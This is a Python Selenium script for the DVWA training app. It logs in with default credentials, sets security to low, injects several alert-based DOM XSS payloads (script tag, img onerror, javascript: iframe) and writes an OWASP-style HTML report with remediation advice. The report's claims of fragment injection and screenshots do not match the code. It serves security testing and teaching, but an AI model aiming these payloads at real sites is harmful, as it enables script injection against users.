

import os
import base64
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# --- Configuration ---
DVWA_URL = "http://localhost/dvwa/"
LOGIN_URL = DVWA_URL + "login.php"
XSS_DOM_URL = DVWA_URL + "vulnerabilities/xss_d/?default=English"
USERNAME = "admin"
PASSWORD = "password"
RESULTS_DIR = "results"
REPORT_FILE = "DVWA_DOM_XSS_Report.html"

PAYLOADS = [
    "<script>alert('XSS-SUCCESS-1')</script>",
    "<img src=x onerror=alert('XSS-SUCCESS-2')>",
    "<iframe src=\"javascript:alert('XSS-SUCCESS-3');\">",
    "/vulnerabilities/xss_d/?default=English<script>alert(1)</script>"
]

def main():
    """Main function to run the DOM XSS test and generate the report."""
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    driver = webdriver.Chrome()
    driver.implicitly_wait(10)

    try:
        login(driver)
        navigate_to_xss_page(driver)
        successful_payloads = test_xss_payloads(driver)
        generate_html_report(successful_payloads)
        print(f"Report generated: {REPORT_FILE}")

    finally:
        driver.quit()

def login(driver):
    """Logs into DVWA."""
    driver.get(LOGIN_URL)
    driver.find_element(By.NAME, "username").send_keys(USERNAME)
    driver.find_element(By.NAME, "password").send_keys(PASSWORD)
    driver.find_element(By.NAME, "Login").click()
    # Set security level to low
    driver.get(DVWA_URL + "security.php")
    driver.find_element(By.NAME, "security").send_keys("low")
    driver.find_element(By.NAME, "seclev_submit").click()


def navigate_to_xss_page(driver):
    """Navigates to the DOM XSS page."""
    driver.get(XSS_DOM_URL)

def test_xss_payloads(driver):
    """Tests a list of XSS payloads and returns the successful ones."""
    successful_payloads = []
    for i, payload in enumerate(PAYLOADS):
        print(f"Testing payload: {payload}")
        url = f"{XSS_DOM_URL}{payload}"
        driver.get(url)

        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            print(f"  -> Success! Alert text: {alert_text}")

            successful_payloads.append({
                "payload": payload,
                "url": url
            })
        except TimeoutException:
            print("  -> Failed.")
            pass
    return successful_payloads

import html

def generate_html_report(successful_payloads):
    """Generates a professional HTML report."""
    report_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    tester_name = "Automated Test Agent"
    status = "Vulnerable" if successful_payloads else "Not Vulnerable"
    severity_color = "red" if successful_payloads else "green"

    findings_html = ""
    if not successful_payloads:
        findings_html = "<p>No DOM XSS vulnerabilities were found.</p>"
    else:
        for result in successful_payloads:
            # Sanitize payload for safe display in HTML
            safe_payload = html.escape(result['payload'])
            findings_html += f"""
                <div class="finding">
                    <h4>Finding: Successful XSS Injection</h4>
                    <p><strong>Payload:</strong></p>
                    <pre><code>{safe_payload}</code></pre>
                    <p><strong>Proof of Concept URL:</strong></p>
                    <pre><a href="{result['url']}" target="_blank">{html.escape(result['url'])}</a></pre>
                </div>
            """

    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>OWASP Web Application Security Test Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }}
            .container {{ max-width: 900px; margin: 20px auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
            .header, .footer {{ text-align: center; padding: 10px 0; }}
            .header h1, .header h2 {{ margin: 0; }}
            .header h1 {{ font-size: 2em; color: #333; }}
            .header h2 {{ font-size: 1.2em; color: #555; }}
            .section {{ margin-bottom: 20px; }}
            .section h3 {{ border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 10px; font-size: 1.5em; color: #444; }}
            .summary-grid {{ display: grid; grid-template-columns: 150px 1fr; gap: 10px; align-items: center; }}
            .summary-grid strong {{ font-size: 1.1em; }}
            .status {{ padding: 5px 10px; border-radius: 5px; color: #fff; font-weight: bold; text-align: center; }}
            .status.vulnerable {{ background-color: {severity_color}; }}
            .status.not-vulnerable {{ background-color: green; }}
            pre {{ background: #eee; padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; font-family: 'Courier New', Courier, monospace; }}
            code {{ font-family: 'Courier New', Courier, monospace; }}
            img {{ max-width: 100%; border-radius: 5px; border: 1px solid #ddd; }}
            .finding {{ border: 1px solid #ddd; padding: 15px; margin-bottom: 15px; border-radius: 5px; background: #fafafa; }}
            .recommendations ul {{ padding-left: 20px; }}
            .recommendations li {{ margin-bottom: 10px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>OWASP Web Application Security Test Report</h1>
                <h2>OTG-CLIENT-001: DOM-Based Cross-Site Scripting on DVWA</h2>
                <p><strong>Report Date:</strong> {report_date}<br>
                <strong>Target URL:</strong> <a href="{DVWA_URL}">{DVWA_URL}</a><br>
                <strong>Tester Name:</strong> {tester_name}</p>
            </div>

            <div class="section">
                <h3>Executive Summary</h3>
                <div class="summary-grid">
                    <strong>Vulnerability:</strong>
                    <span>DOM-Based Cross-Site Scripting (XSS)</span>
                    <strong>Severity:</strong>
                    <span style="color:{severity_color}; font-weight:bold;">High</span>
                    <strong>Status:</strong>
                    <span class="status {'vulnerable' if successful_payloads else 'not-vulnerable'}">{status}</span>
                </div>
                <p>The application was found to be vulnerable to DOM-based Cross-Site Scripting (XSS). This allows an attacker to inject arbitrary client-side scripts into the web page, which then get executed in the browser of a user. This can lead to session hijacking, sensitive data exposure, or defacement of the website.</p>
            </div>

            <div class="section">
                <h3>Test Methodology</h3>
                <p>An automated test was performed using Python and the Selenium library. The process involved the following steps:</p>
                <ol>
                    <li>Programmatically logging into the DVWA application.</li>
                    <li>Navigating to the target 'XSS (DOM)' page.</li>
                    <li>Injecting a series of malicious payloads into the URL fragment (#).</li>
                    <li>Monitoring the browser for the execution of JavaScript, confirmed by the appearance of an alert dialog.</li>
                    <li>Capturing screenshots as evidence for each successful exploit.</li>
                </ol>
                <p><strong>Adaptation for Higher Security Levels:</strong> For 'medium' or 'high' security levels in DVWA, payloads would need to be more sophisticated to bypass filters. This might involve different event handlers, character encoding, or exploiting more complex JavaScript interactions. The script's payload list would need to be updated accordingly.</p>
            </div>

            <div class="section">
                <h3>Findings & Evidence</h3>
                {findings_html}
            </div>

            <div class="section">
                <h3>Vulnerability Description (OWASP Style)</h3>
                <p>DOM-based Cross-Site Scripting is a vulnerability that occurs when a client-side script writes data from a user-controllable source, such as a URL fragment, directly into the Document Object Model (DOM) without proper sanitization. The browser then interprets this data as executable code. Unlike other forms of XSS, the payload is never sent to the server, making it difficult to detect with server-side security controls.</p>
            </div>

            <div class="section">
                <h3>Impact</h3>
                <p>The successful exploitation of this vulnerability can have significant business and technical impacts, including:</p>
                <ul>
                    <li><strong>Session Hijacking:</strong> Attackers can steal session cookies and impersonate legitimate users.</li>
                    <li><strong>Data Theft:</strong> Sensitive information from the page can be exfiltrated to an attacker-controlled domain.</li>
                    <li><strong>Phishing Attacks:</strong> Users can be presented with fake login forms to steal credentials.</li>
                    <li><strong>Website Defacement:</strong> The content of the website can be altered or replaced.</li>
                </ul>
            </div>

            <div class="section recommendations">
                <h3>Recommendations & Remediation</h3>
                <p>To mitigate this vulnerability, the following steps are recommended:</p>
                <ul>
                    <li><strong>Primary Recommendation:</strong> Avoid dynamically writing user-controllable data to the DOM. Redesign the feature if possible to not rely on this behavior.</li>
                    <li><strong>Safe JavaScript APIs:</strong> If data must be written to the DOM, use safe APIs that treat data as text, not HTML. For example, use <code>element.textContent = data;</code> instead of <code>element.innerHTML = data;</code>.</li>
                    <li><strong>Client-Side Sanitization:</strong> Before writing any data to the DOM, sanitize it using a trusted and well-vetted library like DOMPurify. This will strip out any potentially malicious code.</li>
                    <li><strong>Content Security Policy (CSP):</strong> Implement a strong Content Security Policy as a defense-in-depth measure. A well-configured CSP can block the execution of inline scripts and prevent data exfiltration, reducing the impact of an XSS flaw.</li>
                </ul>
            </div>

            <div class="footer">
                <p>End of Report</p>
            </div>
        </div>
    </body>
    </html>
    """
    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(html_content)

if __name__ == "__main__":
    main()
